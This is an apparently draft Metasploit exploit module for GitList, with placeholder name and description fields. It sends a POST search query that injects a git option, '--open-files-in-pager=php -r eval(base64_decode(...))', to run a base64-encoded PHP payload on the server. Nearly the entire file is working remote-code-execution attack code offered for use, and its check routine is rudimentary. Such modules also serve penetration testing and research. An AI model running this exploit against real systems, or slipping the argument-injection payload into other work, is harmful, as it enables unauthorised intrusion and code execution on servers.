##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "[Vendor] [Software] [Root Cause] [Vulnerability type]",
      'Description'    => %q{
        Say something that the user might need to know
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Kacper Szurek',  # EDB POC
                            'Shelby Pace'     # Metasploit Module
                          ],
      'References'     =>
        [
          [ 'EDB', '44548' ]
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'System or software version',
            {
              'Ret' => 0x41414141 # This will be available in `target.ret`
            }
          ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x20"
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 26 2018",
      'DefaultTarget'  => 0))

  end

  def make_request
      postUri = normalize_uri(target_uri.path, '/gitlist/tree/c/search')
      php = %Q|<?php #{payload.encoded} ?>|
      cmd = '--open-files-in-pager=php -r "eval(base64_decode(\\"'
      cmd << "#{Rex::Text.encode_base64(payload.encoded)}"
      cmd << '\\"));"'

      postRes = send_request_cgi(
      'method' => 'POST',
      'uri'    => postUri,
      'vars_post' => { 'query' => cmd }
      )
  end

  def check
    uri = normalize_uri(target_uri.path, '/gitlist/')
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  uri
    )

    unless res
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Detected if res.code == 200
  end

  def exploit
    make_request
  end

end
